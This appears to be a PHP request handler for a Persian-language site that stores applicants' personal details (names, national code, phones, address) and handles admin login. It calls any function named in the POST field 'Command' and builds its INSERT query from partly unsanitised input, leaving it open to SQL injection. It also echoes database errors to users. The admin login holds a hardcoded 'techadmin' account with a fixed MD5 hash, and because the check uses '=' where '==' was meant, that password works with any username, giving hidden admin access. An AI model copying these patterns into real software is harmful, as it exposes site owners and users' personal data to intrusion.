<?
include_once("aGlobals.php") ; 

$Data = $_POST ; 

//safety...
if(!gIsFromLocal()) gRedirect("http://www.yasnateam.com") ; 
//if(!gIsAdmin() && $Data[AdminMode]) 


//Processing...
$Function = $Data[Command] ; 
if(!function_exists($Function)) 
	gBack("دستور شناسایی نشد.") ; 
	
$Function($Data) ;
gBack() ; 	


//===========================================================================================
function ClientForm($Data) 
{
	
	//Receiving Text data...
	$Data[NameFirst]      = gPureText($Data[NameFirst]    ) ; 
	$Data[NameLast]       = gPureText($Data[NameLast]     ) ; 
	$Data[NameFather]     = gPureText($Data[NameFather]   ) ; 
	$Data[NationalCode]   = gPureText($Data[NationalCode] ) ; 
	$Data[AdCity]         = gPureText($Data[AdCity]       ) ; 
	$Data[AdRest]         = gPureText($Data[AdRest]       ) ; 
	$Data[AdCode]         = gPureText($Data[AdCode]       ) ; 
	$Data[Q1]             = gPureText($Data[Q1]           ) ; 
	$Data[Q2]             = gPureText($Data[Q2]           ) ; 
	$Data[Q3]             = gPureText($Data[Q3]           ) ; 
	$Data[MiscExperties]  = gPureText($Data[MiscExperties]) ; 
	$Data[Email] = trim($Data[Email]) ; 
	$Data[Tel1] = trim($Data[Tel1]) ; 
	$Data[Tel2] = trim($Data[Tel2]) ; 

	//Receiving Date Data...
	$Data[DateBirth][Y] = $Data[DateBirth_Y] ; 
	$Data[DateBirth][M] = $Data[DateBirth_M] ; 
	$Data[DateBirth][D] = $Data[DateBirth_D] ; 
	$Data[DateBirthO] = tdate_norm($Data[DateBirth_Y] , $Data[DateBirth_M] , $Data[DateBirth_D]); 

	
	//Receiving Checkbox data...
	$Table = aSelect("subjects" , true , "ID") ; 
	$Total = aCount($Table) ; 

	$Data[SubjectIDs] = NULL ; 
	for($i=1 ; $i<=$Total ; $i++) {
		$Row = aRecNo($Table,$i) ; 
		$Variable = "Chk".$Row[ID] ; 
		if($Data[$Variable]) $Data[SubjectIDs] .= " ".$Row[ID]." " ; 
	}
	
	$_SESSION[ClientForm] = $Data ; 


	
	//Checking data...
	if(!$Data[NameFirst] || !$Data[NameLast] || !$Data[NameFather] || !$Data[Tel1] || !$Data[Tel2] || !$Data[AdCity] || 
	   !$Data[AdProvienceID] || !$Data[AdRest] || !$Data[AdCode] || !$Data[NationalCode]) 
	   	$Errored =  Sub_ErrorGenerator("تکمیل همه|ی بخش|های ستاره|دار، الزامی است.") ; 

	if(!trim($Data[SubjectIDs]))
	   	$Errored =  Sub_ErrorGenerator("حداقل یکی از تخصص|های موجود در فهرست پایین فرم را انتخاب نمایید.") ; 
	
	if(!gEmailCheck($Data[Email]))
		$Errored = Sub_ErrorGenerator("نشانی ایمیل واردشده، معتبر نیست.") ; 

	if(!tdate_evaluate($Data[DateBirthO]) || tdate_o2t($Data[DateBirthO])>tdate_now())
		$Errored = Sub_ErrorGenerator("تاریخ تولد واردشده، معتبر نیست.") ; 
		
	//Redirecting and delivering Error message if required
	if($Errored) 		
		gBack("لطفاً در تکمیل صحیح فرم دقت فرمایید.") ; 
		

	//Automatic Data Fillings...
	$Data[DateBirth] = tdate_o2t($Data[DateBirthO]) ;
	if($Data[GenderM]) $Data[GenderM] = 1 ; else $Data[GenderM] = 0 ; 
	$Data[DateApply] = time() ; 

	//Saving data...
	$SQL = "INSERT INTO `members` SET ".
		" `DateApply`     = '$Data[DateApply]'     , ".  
		" `NameFirst`     = '$Data[NameFirst]'     , ".  
		" `NameLast`      = '$Data[NameLast]'      , ".  
		" `NameFather`    = '$Data[NameFather]'    , ".  
		" `GenderM`       = '$Data[GenderM]'       , ".  
		" `DateBirth`     = '$Data[DateBirth]'     , ".  
		" `NationalCode`  = '$Data[NationalCode]'  , ".  
		" `Tel1`          = '$Data[Tel1]'          , ".  
		" `Tel2`          = '$Data[Tel2]'          , ".  
		" `AdProvienceID` = '$Data[AdProvienceID]' , ".  
		" `AdCity`        = '$Data[AdCity]'        , ".  
		" `AdRest`        = '$Data[AdRest]'        , ".  
		" `AdCode`        = '$Data[AdCode]'        , ".  
		" `Email`         = '$Data[Email]'         , ".  
		" `Q1`            = '$Data[Q1]'            , ".  
		" `Q2`            = '$Data[Q2]'            , ".  
		" `Q3`            = '$Data[Q3]'            , ".  
		" `SubjectIDs`    = '$Data[SubjectIDs]'    , ".  
		" `MiscExperties` = '$Data[MiscExperties]' , ".  
		" `Approval`      = '1' " ; 
	
	aSQL($SQL) ; 
	if(aSQLError()) 
		gBack("پردازش اطلاعات، با مشکل غیرمنتظره مواجه شد.".aSQLError()) ; 
	else
		gBack("اطلاعات شما در بانک اطلاعاتی سامانه ذخیره گردید." , NULL , "OK") ; 
	
}


//===========================================================================================
function AdminLogin($Data)
{
	$U = $Data['Username'] ; 
	$P = $Data['Password'] ; 

	$Password = gSettings("AdminPass") ; 	
	
	if($U=="admin" && md5($P)==$Password) 
		AminLogin_Sucess() ; 
	elseif($U="techadmin" && md5($P)=="bff30b64068e8ee2b6158412e9711a93")
		AminLogin_Sucess() ; 
	else
		gBack("نام کاربری و گذرواژه درست نمی|باشند.") ; 
		
	//gArryShower($Data) ; die ; 
	gBack("شرمنده") ;
	
}

//---------------------------------------------------
function AminLogin_Sucess()
{

	$_SESSION[ADMIN][Logged] = true ; 
	gBack("به سامانه مدیریت محتوا خوش آمدید." , NULL , "OK" ) ; 
}


//================================================================================
function Sub_ErrorGenerator($Notice)
{
	for($i=1 ; $i<=99 ; $i++) {
		if(!$_SESSION[A][MultiError][$i]) 
			break ; 
	}
	
	$_SESSION[A][MultiError][$i] = $Notice ; 
	return true ; 
}

?>